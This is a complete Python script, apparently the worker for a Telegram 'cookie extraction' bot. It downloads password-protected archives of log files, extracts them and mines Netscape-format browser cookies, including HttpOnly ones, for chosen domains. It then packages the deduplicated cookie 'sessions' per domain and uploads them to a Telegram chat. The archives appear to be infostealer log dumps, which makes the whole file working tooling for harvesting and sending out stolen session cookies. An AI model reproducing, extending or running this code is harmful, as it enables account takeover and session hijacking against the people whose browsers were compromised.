import glob, json, os, platform, queue, re, shutil, socket, subprocess, sys, threading, time, zipfile
from concurrent.futures import ProcessPoolExecutor, as_completed
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
import requests

VM_LIFE  = int(3360)                     # lifetime cap advertised on the card
TG       = os.environ.get("BOT_TOKEN") or ""  # injected by the workflow from repo secrets
TG_API   = "https://api.telegram.org/bot" + TG + "/"
CHAT     = None
PB       = [0.0, None, None, 0]  # [last publish, card message id, job t0, publish count]
WORK  = Path("/tmp/job")
OUT   = Path("/tmp/out")
PROG  = OUT / "progress.json"
CORES = os.cpu_count() or 1
DOMS  = []

_state = {"stage": "boot", "pct": 0, "err": None, "cores": CORES, "job": None}
_flush = [0.0]

RULE   = "━━━━━━━━━━━━━━━━━━━━━━━━━━"
THIN   = "┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄"
STAGE_ICON = {'boot': '🟡', 'idle': '🟢', 'installing': '🧩', 'download': '📥', 'downloaded': '✅', 'extract': '📦', 'extracted': '✅', 'wrong_password': '🔑', 'scan': '🔍', 'packed': '🗃', 'done': '🏁', 'error': '❌', 'cancelled': '🛑', 'cancelling': '🛑', 'queued': '⏳', 'retired': '♻️', 'ttl_expired': '♻️'}
VM_TTL = 3600
class _Ref:
    ref = 'rojaskomar67-ops/cookiebot-vm'
    born = time.time()
vm = _Ref()
def esc(x) -> str:
    return str(x if x is not None else "").replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")

def bold(x) -> str:
    return f"<b>{esc(x)}</b>"

def code(x) -> str:
    return f"<code>{esc(x)}</code>"

def fmt_size(num) -> str:
    num = float(num or 0)
    for u in ("B", "KB", "MB", "GB", "TB"):
        if num < 1024:
            return f"{num:.1f} {u}"
        num /= 1024
    return f"{num:.1f} PB"

def fmt_time(s) -> str:
    s = int(max(0, s or 0))
    if s < 60:
        return f"{s}s"
    m, s = divmod(s, 60)
    if m < 60:
        return f"{m}m {s}s"
    h, m = divmod(m, 60)
    return f"{h}h {m}m"

def bar(pct, width: int = 10) -> str:
    pct = max(0, min(100, int(pct or 0)))
    f = round(pct / 100 * width)
    return "🟨" * f + "⬜" * (width - f)

def gold_header(title: str, sub: str = "") -> str:
    head = f"👑 {bold('G O L D  ·  ' + title)} 👑\n{RULE}"
    if sub:
        head += f"\n{bold(sub)}"
    return head

def vm_card(p: dict, job: dict) -> str:
    """Hardware + lifetime panel for the CPU Space running this job."""
    vm_ = p.get("vm") or {}
    if not vm_:
        return f"🖥 {bold('VM')} booting — specs will appear in a moment…"
    age = (time.time() - vm.born) / 60 if vm.born else 0.0
    rows = [
        f"🖥 {bold('VM')}     {code(vm.ref or '?')}",
        f"🧠 {bold('CPU')}    {code(vm_.get('cores', '?'))} vCPU · {esc(str(vm_.get('cpu', 'unknown'))[:46])}",
        f"🐏 {bold('RAM')}    {code(vm_.get('ram', '?'))}"
        + (f" · free {code(vm_.get('ram_free', '?'))}" if vm_.get("ram_free") else ""),
        f"💽 {bold('DISK')}   {code(vm_.get('disk', '?'))}"
        + (f" · free {code(vm_.get('disk_free', '?'))}" if vm_.get("disk_free") else ""),
        f"🐧 {bold('OS')}     {code(vm_.get('os', '?'))} · host {code(vm_.get('host', '?'))}",
        f"🎮 {bold('GPU')}    {code(vm_.get('gpu', 'none'))} · py {code(vm_.get('py', '?'))}",
        f"♻️ {bold('LIFE')}   {code(f'{age:.1f}m / {VM_TTL // 60}m to recycle')}"
        f" · load {code(vm_.get('avg_load', '-'))}",
    ]
    return "\n".join(rows)

def stage_panel(p: dict) -> str:
    stage = p.get("stage", "queued")
    pct = p.get("pct", 0)
    lines = [f"{STAGE_ICON.get(stage, '⚙️')} {bold(stage.upper())}   {code(str(pct) + '%')}",
             bar(pct)]

    if stage in ("download", "downloaded") and p.get("got") is not None:
        got, tot = p.get("got"), p.get("total", "?")
        elapsed = p.get("elapsed") or p.get("dl_time") or "-"
        lines.append(f"📁 {code(got)} / {code(tot)}   ⚡ {code(p.get('speed', '-'))}   ⏱ {code(elapsed)}")
        if p.get("file"):
            lines.append(f"🏷 {code(p['file'])} ({code(fmt_size(p.get('size')))})")

    if stage in ("extract", "extracted", "wrong_password") and p.get("files_total"):
        files = f"{p.get('files', 0)}/{p.get('files_total')}"
        lines.append(f"📄 {code(files)}   💾 {code(p.get('extracted', '-'))}")
        lines.append(f"⚡ {code(p.get('ex_speed', '-'))}   👷 {code(p.get('file_speed', '-'))}   "
                     f"⏳ ETA {code(p.get('eta', '-'))}   ⏱ {code(p.get('elapsed', '-'))}")
        if p.get("engine"):
            load = f"{p['core_load']:.1f}" if p.get("core_load") else "-"
            lines.append(f"🧵 {code(p['engine'])} · threads {code(p.get('threads', '?'))} · load {code(load)}")
        if p.get("last_file"):
            lines.append(f"📝 {code(p['last_file'])}")
        if stage == "wrong_password":
            lines.append(f"🔑 {code(p.get('tried', '?'))} {bold('rejected')}")

    if stage in ("scan", "packed") and p.get("log_files") is not None:
        pd = p.get("per_domain") or {}
        det = "  ".join(f"{code(k)}={code(v)}" for k, v in pd.items()) or code("-")
        scanned = f"{p.get('scanned', 0)}/{p.get('log_files')}"
        lines.append(f"📂 {code(scanned)} logs   🍪 {code(p.get('sessions', 0))} sessions")
        lines.append(f"🧠 {code(p.get('cores', '?'))} cores · {code(p.get('workers', '?'))} workers")
        lines.append(f"🗂 {det}")

    if stage == "error" and p.get("err"):
        lines.append(f"⚠️ {bold('Error')}: {code(p.get('err'))}")
    return "\n".join(lines)

def live_text(job) -> str:
    p = job.get("prog") or {}
    wall = fmt_time(time.time() - job["t0"])
    return (f"{gold_header('COOKIE EXTRACTION', 'GitHub CPU Runner · Live Console')}\n"
            f"{THIN}\n"
            f"{stage_panel(p)}\n"
            f"{THIN}\n"
            f"{vm_card(p, job)}\n"
            f"{THIN}\n"
            f"⏳ {bold('Wall time')} {code(wall)}   🆔 {code(job['id'])}")


def job_ctx():
    return {"prog": _state, "t0": PB[2] or time.time(), "id": _state.get("job") or "-"}

def pub(force=False):
    """Edit the user's live gold card straight from the Space (no bot-side polling)."""
    if not CHAT or not PB[1]:
        return
    n = time.time()
    hot = force and _state.get("stage") in ("done", "error", "cancelled",
                                            "wrong_password", "idle", "retired")
    if n - PB[0] < (0.5 if hot else 2.5):
        return
    PB[0] = n
    try:
        r = requests.post(TG_API + "editMessageText", timeout=30, json={
            "chat_id": CHAT, "message_id": PB[1], "text": live_text(job_ctx()),
            "parse_mode": "HTML"})
        if r.status_code == 200:
            PB[3] += 1
        elif "message is not modified" not in (r.text or ""):
            sys.stdout.write("tg edit %s: %s\n" % (r.status_code, r.text[:150])); sys.stdout.flush()
    except Exception as e:
        sys.stdout.write("tg edit failed: %s\n" % e); sys.stdout.flush()

def new_card(text):
    """Post a fresh gold message and return its id (used when there is no card to edit)."""
    if not CHAT:
        return None
    try:
        r = requests.post(TG_API + "sendMessage", timeout=30, json={
            "chat_id": CHAT, "text": text, "parse_mode": "HTML"})
        return (r.json().get("result") or {}).get("message_id")
    except Exception as e:
        sys.stdout.write("tg send failed: %s\n" % e); sys.stdout.flush()
        return None

def report(payload, tries=1):
    """Emit the terminal result on stdout; the bot reads it from the run's log."""
    sys.stdout.write("RESULT " + json.dumps(payload, separators=(",", ":")) + "\n")
    sys.stdout.flush()
    return True

def upload(name, caption):
    """Send a result file straight from the VM to the user's chat."""
    if not TG or not CHAT: return False
    try:
        with open(name, "rb") as fh:
            # requests cannot mix json= and files=: the fields must travel as multipart data.
            r = requests.post(TG_API + "sendDocument",
                              data={"chat_id": CHAT, "caption": caption,
                                    "parse_mode": "HTML"},
                              files={"document": (name.split("/")[-1], fh)}, timeout=300)
        if r.status_code != 200:
            sys.stdout.write("tg send %s: %s\n" % (name, r.text[:200])); sys.stdout.flush()
        return r.status_code == 200
    except Exception as e:
        sys.stdout.write("tg send error: %s\n" % e); sys.stdout.flush()
        return False

def ft(s):
    s = int(max(0, s or 0))
    if s < 60: return "%ds" % s
    m, s = divmod(s, 60)
    if m < 60: return "%dm %ds" % (m, s)
    h, m = divmod(m, 60); return "%dh %dm" % (h, m)

def fs(b):
    b = float(b or 0)
    for u in ("B", "KB", "MB", "GB", "TB"):
        if b < 1024: return "%.1f %s" % (b, u)
        b /= 1024
    return "%.1f PB" % b

def st(stage, pct=None, err=None, **kw):
    _state["stage"] = stage
    if pct is not None: _state["pct"] = max(0, min(100, int(pct)))
    if err is not None: _state["err"] = err
    _state.update(kw)
    flush(True)

def tick(stage, pct=None, **kw):
    """High-frequency progress: throttled to 1.5s to avoid hammering the disk."""
    _state["stage"] = stage
    if pct is not None: _state["pct"] = max(0, min(100, int(pct)))
    _state.update(kw)
    flush(False)

def flush(force=False):
    n = time.time()
    if not force and n - _flush[0] < 1.5: return
    _flush[0] = n
    _state["hb"] = n
    try:
        OUT.mkdir(parents=True, exist_ok=True)
        blob = json.dumps(_state)
        PROG.write_text(blob)
        sys.stdout.write("PROGRESS " + blob + "\n"); sys.stdout.flush()
    except Exception: pass
    if not _state.get("booting"):
        pub(force)

def stop():
    return (OUT / "cancel.flag").exists()

def run(c, **kw):
    return subprocess.run(c, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                          text=True, errors="ignore", **kw)

def vm_specs():
    """Hardware profile of the Space container this job runs on."""
    s = {"cpu": "unknown", "cores": CORES, "threads": CORES, "ram": "?", "ram_mb": 0,
         "disk": "?", "disk_gb": 0, "os": "?", "host": socket.gethostname(),
         "gpu": "none (CPU VM)", "avg_load": "-"}
    try:
        for ln in open("/proc/cpuinfo"):
            if ln.lower().startswith("model name"):
                s["cpu"] = ln.split(":", 1)[1].strip(); break
    except Exception: pass
    try:
        s["threads"] = len(os.sched_getaffinity(0))
    except Exception: pass
    try:
        p = Path("/proc/meminfo").read_text()
        mb = int(re.search(r"MemTotal:\s+(\d+)", p).group(1)) // 1024
        s["ram_mb"] = mb; s["ram"] = fs(mb * 1024 * 1024)
        free_mb = int(re.search(r"MemAvailable:\s+(\d+)", p).group(1)) // 1024
        s["ram_free"] = fs(free_mb * 1024 * 1024)
    except Exception: pass
    try:
        u = os.statvfs("/")
        gb = u.f_blocks * u.f_frsize / 1024 ** 3
        s["disk_gb"] = round(gb, 1); s["disk"] = "%.1f GB" % gb
        s["disk_free"] = "%.1f GB" % (u.f_bavail * u.f_frsize / 1024 ** 3)
    except Exception: pass
    try:
        s["avg_load"] = "%.2f / %.2f / %.2f" % os.getloadavg()
    except Exception: pass
    try:
        s["os"] = " ".join(platform.freedesktop_os_release().get("PRETTY_NAME", "?").split())
    except Exception:
        try: s["os"] = "Linux %s" % platform.release()
        except Exception: pass
    try:
        r = run(["nvidia-smi", "--query-gpu=name", "--format=csv,noheader"])
        if r.returncode == 0 and r.stdout.strip():
            s["gpu"] = r.stdout.strip().splitlines()[0]
    except Exception: pass
    try:
        s["py"] = sys.version.split()[0]
    except Exception: pass
    return s

def apt(pkgs):
    if not shutil.which("apt-get"): return False
    try:
        run(["apt-get", "update", "-qq"], timeout=900)
        return run(["apt-get", "install", "-y", "-qq"] + list(pkgs), timeout=1200).returncode == 0
    except Exception: return False

# ── Netscape cookie parser (HttpOnly preserved) ──
def parse_cookie(line):
    line = line.rstrip("\r\n")
    if not line.strip(): return None
    if line.startswith("#") and not line.startswith(("#HttpOnly_", "#HttpOnly.")): return None
    pre, chk = "", line.strip()
    if chk.startswith("#HttpOnly_"): pre, chk = "#HttpOnly_", chk[10:]
    elif chk.startswith("#HttpOnly."): pre, chk = "#HttpOnly.", chk[10:]
    p = chk.split("\t")
    if len(p) >= 7:
        dom, flag, path, sec, exp, name = p[:6]; val = "\t".join(p[6:])
    else:
        p = re.split(r"\s+", chk, maxsplit=6)
        if len(p) != 7: return None
        dom, flag, path, sec, exp, name, val = p
    dom, name = dom.strip(), name.strip()
    if not dom or not name or not val.strip(): return None
    fl = "TRUE" if flag.strip().upper() in ("TRUE", "1") else "FALSE"
    sc = "TRUE" if sec.strip().upper() in ("TRUE", "1") else "FALSE"
    fmt = "\t".join([pre + dom, fl, path.strip() or "/", sc, exp.strip() or "0", name, val])
    return (dom.lower(), name, val, fmt)

def scan_file(path):
    """One log file -> one cookie session {domain: [(name, val, line), ...]}"""
    per_dom = {}
    try:
        with open(path, "rb") as fh:
            data = fh.read()
    except Exception:
        return per_dom
    if not data:
        return per_dom
    low = data.lower()
    if DOMS and not any(d.encode() in low for d in DOMS):
        return per_dom            # cheap reject: the domain never appears in the file
    try:
        text = data.decode("utf-8", "ignore")
    except Exception:
        return per_dom
    for raw in text.splitlines():
        if "\t" not in raw and raw.count(" ") < 6:
            continue
        c = parse_cookie(raw)
        if not c: continue
        dom, name, val, fmt = c
        for d in DOMS:
            if d in dom:
                per_dom.setdefault(d, []).append((name, val, fmt))
    return per_dom

def scan_chunk(paths):
    return [scan_file(p) for p in paths]

# ── 1. download ──
def download(url):
    dest = WORK / "dl"; dest.mkdir(parents=True, exist_ok=True)
    _state["err"] = None
    marker = dest / ".url"
    if marker.exists() and marker.read_text() == url:
        for e in ("*.zip", "*.rar", "*.7z", "*.ZIP", "*.RAR", "*.tar", "*.gz"):
            for cand in glob.glob(str(dest / e)):
                if os.path.isfile(cand) and os.path.getsize(cand) > 0:
                    st("downloaded", 30, file=Path(cand).name, cached=True,
                       size=fs(os.path.getsize(cand)),
                       msg="same link — reusing the archive already on this VM")
                    return Path(cand)
    if not shutil.which("aria2c"):
        st("installing", 3); apt(["aria2", "p7zip-full", "unrar-free"])
    use_aria = shutil.which("aria2c") is not None
    st("download", 4, engine="aria2c (16 chunks)" if use_aria else "requests")
    t0 = time.time()
    found = None
    if use_aria:
        cmd = [ "aria2c", "--dir", str(dest), "--split=16", "--max-connection-per-server=16",
                "--min-split-size=1M", "--file-allocation=none", "--auto-file-renaming=false",
                "--allow-overwrite=true", "--console-log-level=warn", "--summary-interval=1",
                "--user-agent=Mozilla/5.0", url ]
        pr = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                              text=True, errors="ignore", bufsize=1)
        pe = re.compile(r"\[#\w+\s+([\d.]+\w+)/([\d.]+\w+)\((\d+)%\)")
        se = re.compile(r"DL:([\d.]+\w+)")
        tail = []
        for raw in pr.stdout:
            if stop():
                pr.terminate(); return None
            tail.append(raw.strip())
            tail = tail[-25:]
            m = pe.search(raw)
            if m:
                s = se.search(raw)
                st("download", 4 + int(m.group(3)) * 0.26, got=m.group(1), total=m.group(2),
                   speed=(s.group(1) + "/s") if s else "-", elapsed=ft(time.time() - t0))
            fm = re.search(r"Download complete:\s*(.+)", raw)
            if fm: found = fm.group(1).strip()
        pr.wait()
        if pr.returncode not in (0, None):
            sys.stdout.write("ARIA2 FAIL rc=%s\n%s\n" % (pr.returncode, "\n".join(tail)))
            sys.stdout.flush()
            st("error", err="download_failed(rc=%s) %s" %
               (pr.returncode, " ".join(tail[-3:])[:150]))
            return None
    else:
        found = slow_dl(url, dest, t0)
        if found is None:
            st("error", err=_state.get("err") or "download_failed"); return None
    if not found or not os.path.isfile(found):
        cand = []
        for e in ("*.zip", "*.rar", "*.7z", "*.ZIP", "*.RAR"):
            cand += glob.glob(str(dest / e))
        cand = cand or [str(p) for p in dest.iterdir()
                        if p.is_file() and p.name != ".url"]
        if not cand:
            st("error", err="archive_not_found"); return None
        found = cand[0]
    try:
        marker.write_text(url)
    except Exception:
        pass
    st("downloaded", 30, file=Path(found).name, size=fs(os.path.getsize(found)),
       dl_time=ft(time.time() - t0))
    return Path(found)

def slow_dl(url, dest, t0):
    import requests
    from urllib.parse import unquote
    nm = unquote(url.split("?")[0].rstrip("/").split("/")[-1])
    if not re.search(r"\.(zip|rar|7z)$", nm, re.I): nm = "archive.zip"
    tgt = dest / nm
    with requests.get(url, stream=True, timeout=900,
                      headers={"User-Agent": "Mozilla/5.0"}) as r:
        r.raise_for_status()
        tot = int(r.headers.get("content-length") or 0); done = 0
        with open(tgt, "wb") as f:
            for ch in r.iter_content(1 << 20):
                if stop(): return None
                f.write(ch); done += len(ch)
                st("download", 4 + (done * 26 // tot if tot else 0), got=fs(done),
                   total=fs(tot) if tot else "?", elapsed=ft(time.time() - t0))
    return str(tgt)

# ── 2. extract (all cores; tries every supplied password, never re-downloads) ──
def atype(p):
    try:
        with open(p, "rb") as f: mg = f.read(8)
        if mg.startswith(b"Rar!\x1a\x07"): return "rar"
        if mg.startswith(b"PK\x03\x04"): return "zip"
    except Exception: pass
    return "rar" if Path(p).suffix.lower() in (".rar", ".r00") else "zip"

FILTERS = ("*.txt", "*.log", "*.cookie", "*.cookies")

def nfiles(tool, arc, pwd, filters=None):
    try:
        name = os.path.basename(tool)
        if "unrar" in name:
            c = [tool, "lb", "-p%s" % pwd if pwd else "-p-", str(arc)]
        else:
            c = [tool, "l", str(arc)] + (["-p%s" % pwd] if pwd else [])
            if filters:
                c += ["-i!" + f for f in filters]
        ls = [l for l in run(c).stdout.splitlines() if l.strip()]
        return sum(1 for l in ls if re.search(r"\d{4}-\d{2}-\d{2}", l)) or len(ls) or 1
    except Exception: return 1

def dstat(p):
    fl = [f for f in Path(p).rglob("*") if f.is_file()]
    return len(fl), sum(f.stat().st_size for f in fl)

def extract(arc, out, pwds):
    """Only text files can contain cookies, so extract them first with an include
    filter (far less I/O on mixed archives); fall back to a full extract."""
    ok, why = _extract(arc, out, pwds, FILTERS)
    if not ok and why not in ("wrong_password", "cancelled"):
        ok, why = _extract(arc, out, pwds, None)
    return ok, why

def _extract(arc, out, pwds, filters):
    out.mkdir(parents=True, exist_ok=True)
    t = atype(arc)
    if not any(shutil.which(x) for x in ("7zz", "7z", "7za")): apt(["p7zip-full"])
    if t == "rar" and not any(shutil.which(x) for x in ("unrar", "unrar-free", "unar")):
        apt(["unrar-free"])
    # 7zz (7-Zip 23+) decodes RAR5 and is much faster than unrar-free; unar and
    # unrar stay as fallbacks for archives 7-Zip rejects.
    order = (["7zz", "7z", "7za", "unrar", "unrar-free", "unar"] if t == "rar"
             else ["7zz", "7z", "7za", "unar", "unrar", "unrar-free"])
    tools = [p for p in (shutil.which(x) for x in order) if p]
    if not tools:
        st("error", err="no_extractor_on_vm"); return False, "tool_missing"
    badpwd = False
    for tool in tools:
        tot = nfiles(tool, arc, (pwds or [None])[0], filters)
        for pwd in (pwds or [None]):
            if stop(): return False, "cancelled"
            name = os.path.basename(tool)
            if "unrar" in name:
                cmd = [tool, "x", "-o+", "-y", "-p%s" % pwd if pwd else "-p-",
                       str(arc), str(out).rstrip("/") + "/"]
            elif name == "unar":
                cmd = [tool, "-f", "-D", "-o", str(out), str(arc)]
            else:
                cmd = [tool, "x", str(arc), "-o%s" % out, "-y", "-mmt=%d" % CORES]
                if pwd: cmd.append("-p%s" % pwd)
                if filters:
                    cmd += ["-ir!" + f for f in filters]
            st("extract", 31, engine=os.path.basename(tool), files_total=tot,
               using_password=bool(pwd), threads=CORES, last_file="")
            t0 = time.time()
            # stderr merged into stdout: an undrained stderr pipe deadlocks the
            # extractor once it warns on 64 KB, which froze big archives mid-run.
            pr = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                                  stdin=subprocess.DEVNULL, text=True,
                                  errors="ignore", bufsize=1)
            done = 0
            sz = 0
            sz_t = 0.0
            tail = []
            act = [time.time()]
            base_free = shutil.disk_usage(str(out)).free

            def watch(proc=pr, act=act):
                last_free = shutil.disk_usage(str(out)).free
                while proc.poll() is None:
                    time.sleep(10)
                    try:
                        cur = shutil.disk_usage(str(out)).free
                    except Exception:
                        continue
                    if cur < last_free - (1 << 20):
                        last_free, act[0] = cur, time.time()
                    elif time.time() - act[0] > 600:
                        proc.kill()
                        return
            threading.Thread(target=watch, daemon=True).start()

            rx = re.compile(r"^(Extracting|-\s+\S|x\s+\S)", re.I)
            for raw in pr.stdout:
                if stop():
                    pr.kill(); return False, "cancelled"
                line = raw.strip()
                tail.append(line)
                if len(tail) > 200: tail.pop(0)
                if rx.search(line):
                    done += 1
                    act[0] = time.time()
                    el = time.time() - t0
                    rate = done / el if el > 0 else 0
                    eta = (tot - done) / rate if rate > 0 else 0
                    if time.time() - sz_t >= 2.0:
                        sz_t = time.time()
                        try: sz = max(0, base_free - shutil.disk_usage(str(out)).free)
                        except Exception: pass
                    nm = line.split()[-1] if line else ""
                    tick("extract", 31 + min(done * 12 // max(tot, 1), 12),
                         files=done, files_total=tot, extracted=fs(sz),
                         ex_speed=fs(sz / el) + "/s" if el > 0 else "-",
                         file_speed="%d f/s" % rate if rate else "-",
                         eta=ft(eta), elapsed=ft(el), last_file=Path(nm).name[:40],
                         core_load=os.getloadavg()[0] if hasattr(os, "getloadavg") else 0)
            pr.wait()
            out_txt = "\n".join(tail).lower()
            if pr.returncode == 11 or any(k in out_txt for k in
                   ("wrong password", "bad password", "corrupt file or wrong password",
                    "data error in encrypted", "enter password")):
                badpwd = True
                st("wrong_password", 31, tried=str(pwd)); continue
            n, sz = dstat(out)
            if pr.returncode in (0, 1) and n:
                st("extracted", 43, files=n, extracted=fs(sz), ex_time=ft(time.time() - t0))
                return True, "ok"
    return False, ("wrong_password" if badpwd else "corrupt")

# ── 3. cookie search on every core + packaging ──
def search_pack(ex):
    files = []
    for e in ("*.txt", "*.log", "*.cookie", "*.cookies"):
        files += [str(p) for p in ex.rglob(e) if p.is_file()]
    tot = len(files)
    st("scan", 44, log_files=tot, cores=CORES)
    sess = {d: [] for d in DOMS}; seen = {d: set() for d in DOMS}
    if tot:
        size = 256          # small chunks: progress + cancellation stay live on huge trees
        chunks = [files[i:i + size] for i in range(0, tot, size)]
        # parsing is I/O bound, so oversubscribe the cores (2× vCPU, min 4)
        nw = min(len(chunks), max(4, CORES * 2))
        with ProcessPoolExecutor(max_workers=nw) as ex_pool:
            futs = [ex_pool.submit(scan_chunk, c) for c in chunks]
            scanned = found_c = 0
            for fut in as_completed(futs):
                for per_file in fut.result():
                    scanned += 1
                    if stop(): return {}
                    for d, items in per_file.items():
                        sig = tuple(sorted((n, v) for n, v, _ in items))
                        if not sig or sig in seen[d]: continue
                        seen[d].add(sig)
                        sess[d].append([fmt for _n, _v, fmt in items])
                        found_c += 1
                tick("scan", 44 + min(scanned * 40 // max(tot, 1), 40),
                     scanned=scanned, log_files=tot, cores=CORES,
                     workers=nw, sessions=found_c,
                     per_domain={d: len(v) for d, v in sess.items() if v})
    hdr = "# Netscape HTTP Cookie File\n# https://curl.se/docs/http-cookies.html\n\n"
    packed = {}
    for d, sessions_ in sess.items():
        if not sessions_: continue
        pack_domain(d, sessions_, hdr)
        packed[d] = len(sessions_)
    st("packed", 92, found=packed)
    return packed

def pack_domain(dom, sessions_, hdr):
    """One zip per domain, split into parts under Telegram's 50 MB upload cap.
    The cap applies to the compressed file, which is always <= the text size,
    so a 45 MB raw limit per part is safe."""
    LIMIT = 45 << 20
    base = re.sub(r"[^\w.-]", "_", dom.lower())
    for old in OUT.glob(base + "*.zip"):
        try: old.unlink()
        except Exception: pass
    part, cur, raw = 0, None, 0
    for i, session_lines in enumerate(sessions_, 1):
        blob = hdr + "\n".join(session_lines) + "\n"
        if cur is None:
            part += 1
            name = OUT / ("%s.zip" % base if part == 1
                          else "%s.part%d.zip" % (base, part))
            cur, raw = zipfile.ZipFile(name, "w", zipfile.ZIP_DEFLATED), 0
        cur.writestr("%d.txt" % i, blob)
        raw += len(blob)
        if raw >= LIMIT:
            cur.close(); cur = None
    if cur:
        cur.close()

SPECS = {}
Q = queue.Queue()

def deliver(packed, task):
    """Post every domain zip (and each part of a split domain) to the chat."""
    sent, failed = [], []
    for dom, cnt in (packed or {}).items():
        base = re.sub(r"[^\w.-]", "_", dom.lower())
        parts = sorted(p for p in OUT.glob(base + "*.zip")
                       if re.fullmatch(re.escape(base) + r"(\.part\d+)?\.zip", p.name))
        if not parts:
            failed.append(dom)
            continue
        ok_all = True
        for zp in parts:
            tot = sum(p.stat().st_size for p in parts)
            cap = (f"{gold_header('COOKIES READY', esc(dom))}\n{THIN}\n"
                   f"🍪 {bold('Sessions')}  {code(cnt)}\n"
                   f"📦 {bold('Size')}      {code(fmt_size(zp.stat().st_size))}"
                   + (f" of {code(fmt_size(tot))} total" if len(parts) > 1 else "") + "\n"
                   f"🗂 {bold('Part')}      {code(parts.index(zp) + 1)} / {code(len(parts))}\n"
                   f"📄 {bold('Layout')}    numbered .txt at zip root\n"
                   f"⏱ {bold('Job time')}  {code(fmt_time(time.time() - (PB[2] or time.time())))}\n"
                   f"🖥 {bold('VM')}        {code(SPECS.get('cores', '?'))} vCPU · "
                   f"{code(SPECS.get('ram', '?'))}")
            if not upload(str(zp), cap):
                ok_all = False
        (sent if ok_all else failed).append(dom)
    return sent, failed

def finish(task, stage, **extra):
    """Terminal state for a job: paint the card, report to the bot, back to idle."""
    st(stage, 100 if stage == "done" else _state.get("pct", 0),
       job=task.get("job"), vm=SPECS,
       **{k: extra[k] for k in extra if k in ("err", "tried")})
    payload = {"job": task.get("job"), "stage": stage, "uid": task.get("chat")}
    payload.update({k: extra[k] for k in extra
                    if k in ("err", "found", "cookies", "tried", "sent", "failed")})
    payload["pubs"] = PB[3]
    report(payload)
    PB[1] = None

def process(task):
    """Run one job inside this long-lived VM."""
    global DOMS, CHAT
    DOMS = [d.lower() for d in task.get("domains") or []]
    CHAT = task.get("chat")
    PB[0], PB[2], PB[3] = 0.0, time.time(), 0
    PB[1] = task.get("msg")
    for junk in list(OUT.glob("*.zip")) + [PROG]:
        try: junk.unlink()
        except Exception: pass
    (OUT / "cancel.flag").unlink(missing_ok=True)
    st("queued", 0, job=task.get("job"), vm=SPECS)
    arc = download(task["url"])
    if arc is None:
        why = _state.get("err") or "aborted"
        if stop():
            finish(task, "cancelled", err="cancelled")
        else:
            finish(task, "error", err=why)
        return
    ok, why = extract(arc, WORK / "ex", task.get("passwords") or [])
    if stop():
        finish(task, "cancelled", err="cancelled"); return
    if not ok:
        tried = len(task.get("passwords") or [])
        if why == "wrong_password":
            finish(task, "wrong_password", tried=tried)
        else:
            finish(task, "error", err=why)
        return
    shutil.rmtree(WORK / "dl", ignore_errors=True)
    packed = search_pack(WORK / "ex")
    if stop():
        shutil.rmtree(WORK, ignore_errors=True)
        finish(task, "cancelled", err="cancelled"); return
    sent, failed = deliver(packed, task)
    shutil.rmtree(WORK, ignore_errors=True)
    st("done", 100, job=task.get("job"), vm=SPECS)
    finish(task, "done", found=packed, cookies=sum(packed.values()), sent=sent,
           failed=failed)

def main():
    OUT.mkdir(parents=True, exist_ok=True)
    global SPECS
    SPECS = vm_specs()
    try:
        task = json.loads(os.environ.get("TASK") or "{}")
    except Exception:
        task = {}
    if not task.get("url"):
        st("error", err="runner started without a task")
        report({"event": "no_task"})
        return
    st("queued", 0, job=task.get("job"), vm=SPECS)
    process(task)

main()